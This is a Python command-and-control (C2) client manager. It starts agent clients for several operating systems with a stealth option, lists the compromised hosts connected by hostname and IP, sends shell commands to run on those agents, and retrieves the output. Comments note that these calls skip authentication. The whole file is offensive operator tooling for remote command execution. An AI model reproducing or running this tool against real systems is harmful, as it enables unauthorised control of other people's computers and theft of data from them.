#!/usr/bin/env python3
"""
C2 Client Manager
Manages multiple C2 clients and provides a unified interface
"""

import requests
import json
import time
import platform
import subprocess
import threading
import argparse
import sys
import os
from datetime import datetime

class ClientManager:
    def __init__(self, server_url="http://localhost:8000"):
        self.server_url = server_url
        self.session = requests.Session()
        self.clients = {}
        self.running = False
    
    def get_available_clients(self):
        """Get list of available clients"""
        clients = {
            "basic": "sample_agent.py",
            "advanced": "advanced_client.py",
            "windows": "windows_client.py",
            "linux": "linux_client.py",
            "mac": "mac_client.py"
        }
        return clients
    
    def start_client(self, client_type, client_id=None, stealth=False):
        """Start a specific client type"""
        clients = self.get_available_clients()
        
        if client_type not in clients:
            print("Unknown client type: {}. Available: {}".format(client_type, list(clients.keys())))
            return False
        
        client_script = clients[client_type]
        
        # Build command
        cmd = ["python3", client_script, "--server", self.server_url]
        
        if client_id:
            cmd.extend(["--client-id", client_id])
        
        if stealth:
            cmd.append("--stealth")
        
        try:
            # Start client in background
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.clients[client_type] = {
                "process": process,
                "client_id": client_id,
                "start_time": datetime.now(),
                "type": client_type
            }
            
            print("Started {} client with PID {}".format(client_type, process.pid))
            return True
        except Exception as e:
            print("Failed to start {} client: {}".format(client_type, e))
            return False
    
    def stop_client(self, client_type):
        """Stop a specific client"""
        if client_type not in self.clients:
            print("Client {} not running".format(client_type))
            return False
        
        try:
            process = self.clients[client_type]["process"]
            process.terminate()
            process.wait(timeout=5)
            
            del self.clients[client_type]
            print("Stopped {} client".format(client_type))
            return True
        except Exception as e:
            print("Failed to stop {} client: {}".format(client_type, e))
            return False
    
    def stop_all_clients(self):
        """Stop all running clients"""
        for client_type in list(self.clients.keys()):
            self.stop_client(client_type)
    
    def get_client_status(self):
        """Get status of all clients"""
        status = {}
        for client_type, client_info in self.clients.items():
            process = client_info["process"]
            status[client_type] = {
                "pid": process.pid,
                "running": process.poll() is None,
                "start_time": client_info["start_time"].isoformat(),
                "client_id": client_info["client_id"]
            }
        return status
    
    def list_connected_agents(self):
        """List agents connected to the server"""
        try:
            # Get agents directly without authentication
            response = self.session.get("{}/api/agents".format(self.server_url))
            
            if response.status_code == 200:
                agents = response.json()["agents"]
                return agents
            else:
                print("Failed to get agents: {}".format(response.text))
                return []
        except Exception as e:
            print("Error getting agents: {}".format(e))
            return []
    
    def execute_command_on_agent(self, agent_id, command, command_type="shell"):
        """Execute a command on a specific agent"""
        try:
            # Execute command directly without authentication
            command_data = {
                "agent_id": agent_id,
                "command": command,
                "command_type": command_type
            }
            
            response = self.session.post(
                "{}/api/commands/execute".format(self.server_url),
                json=command_data
            )
            
            if response.status_code == 200:
                print("Command queued for agent {}".format(agent_id))
                return True
            else:
                print("Failed to execute command ({}): {}".format(response.status_code, response.text))
                return False
        except Exception as e:
            print("Error executing command: {}".format(e))
            return False
    
    def get_command_results(self, agent_id):
        """Get command results for a specific agent"""
        try:
            # Get command results directly without authentication
            response = self.session.get(
                "{}/api/commands/{}/results".format(self.server_url, agent_id)
            )
            
            if response.status_code == 200:
                results = response.json()["results"]
                return results
            else:
                print("Failed to get command results: {}".format(response.text))
                return []
        except Exception as e:
            print("Error getting command results: {}".format(e))
            return []
    
    def interactive_mode(self):
        """Interactive mode for managing clients"""
        print("C2 Client Manager - Interactive Mode")
        print("=" * 40)
        
        while True:
            try:
                print("\nAvailable commands:")
                print("1. start <client_type> [client_id] [--stealth] - Start a client")
                print("2. stop <client_type> - Stop a client")
                print("3. status - Show client status")
                print("4. agents - List connected agents")
                print("5. exec <agent_id> <command> - Execute command on agent")
                print("6. results <agent_id> - Show command results for agent")
                print("7. quit - Exit")
                
                command = input("\nEnter command: ").strip().split()
                
                if not command:
                    continue
                
                if command[0] == "quit":
                    break
                elif command[0] == "start":
                    if len(command) < 2:
                        print("Usage: start <client_type> [client_id] [--stealth]")
                        continue
                    
                    client_type = command[1]
                    client_id = command[2] if len(command) > 2 and not command[2].startswith("--") else None
                    stealth = "--stealth" in command
                    
                    self.start_client(client_type, client_id, stealth)
                
                elif command[0] == "stop":
                    if len(command) < 2:
                        print("Usage: stop <client_type>")
                        continue
                    
                    self.stop_client(command[1])
                
                elif command[0] == "status":
                    status = self.get_client_status()
                    if status:
                        for client_type, info in status.items():
                            print("{}: PID {}, Running: {}, Started: {}".format(
                                client_type, info["pid"], info["running"], info["start_time"]
                            ))
                    else:
                        print("No clients running")
                
                elif command[0] == "agents":
                    agents = self.list_connected_agents()
                    if agents:
                        for agent_id, agent_info in agents.items():
                            print("{}: {} ({}) - {}".format(
                                agent_id, agent_info["hostname"], agent_info["ip_address"], agent_info["status"]
                            ))
                    else:
                        print("No agents connected")
                
                elif command[0] == "exec":
                    if len(command) < 3:
                        print("Usage: exec <agent_id> <command>")
                        continue
                    
                    agent_id = command[1]
                    cmd = " ".join(command[2:])
                    self.execute_command_on_agent(agent_id, cmd)
                
                elif command[0] == "results":
                    if len(command) < 2:
                        print("Usage: results <agent_id>")
                        continue
                    
                    agent_id = command[1]
                    results = self.get_command_results(agent_id)
                    if results:
                        for result in results[-5:]:  # Show last 5 results
                            print("Command: {} - Success: {} - Result: {}".format(
                                result.get("command_id", "unknown"),
                                result.get("success", False),
                                result.get("result", "")[:100] + "..." if len(result.get("result", "")) > 100 else result.get("result", "")
                            ))
                    else:
                        print("No results found")
                
                else:
                    print("Unknown command: {}".format(command[0]))
            
            except KeyboardInterrupt:
                print("\nExiting...")
                break
            except Exception as e:
                print("Error: {}".format(e))
        
        # Cleanup
        self.stop_all_clients()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="C2 Client Manager")
    parser.add_argument("--server", default="http://localhost:8000", help="C2 Server URL")
    parser.add_argument("--interactive", action="store_true", help="Start interactive mode")
    parser.add_argument("--start", help="Start a specific client type")
    parser.add_argument("--client-id", help="Client ID for starting client")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    
    args = parser.parse_args()
    
    manager = ClientManager(server_url=args.server)
    
    if args.interactive:
        manager.interactive_mode()
    elif args.start:
        manager.start_client(args.start, args.client_id, args.stealth)
        try:
            # Keep running until interrupted
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping client...")
            manager.stop_all_clients()
    else:
        print("Use --interactive for interactive mode or --start <client_type> to start a client")
        print("Available client types: basic, advanced, windows, linux")

if __name__ == "__main__":
    main()
